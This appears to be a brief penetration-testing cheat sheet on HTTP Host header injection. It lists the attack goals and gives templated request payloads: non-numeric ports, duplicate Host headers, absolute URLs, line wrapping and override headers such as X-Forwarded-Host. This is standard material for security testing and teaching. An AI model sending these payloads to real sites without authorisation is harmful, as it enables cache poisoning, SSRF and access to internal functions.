### attack vectors for host header injection
```
web cache poisoning
SQLi
access restricted functionality (internal websites)
SSRF
```

### supply a non-numeric port
```
GET /<path> HTTP/1.1
Host: <targetDomain>:<evilStuff>
```

### send duplicate host header
```
GET /<path> HTTP/1.1
Host: <targetDomain>
Host: <evilStuff>
```

### supply absolute URL
```
GET https://<targetDomain> HTTP/1.1
Host: <evilStuff>
```

### line wrapping
```
GET /<path>HTTP/1.1
 Host: <evilStuff>
Host: <targetDomain>
```

### host override headers (alternative: X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded)
```
GET /<path> HTTP/1.1
Host: <targetDomain>
X-Forwarded-Host: <evilStuff>
```

